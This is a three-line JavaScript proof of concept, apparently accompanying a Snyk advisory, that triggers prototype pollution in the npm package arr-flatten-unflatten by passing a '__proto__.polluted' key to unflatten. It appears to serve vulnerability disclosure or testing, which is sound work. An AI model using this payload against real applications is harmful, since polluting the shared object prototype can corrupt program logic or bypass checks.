//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
const { unflatten } = require("arr-flatten-unflatten");
unflatten({ "__proto__.polluted": "yes" });
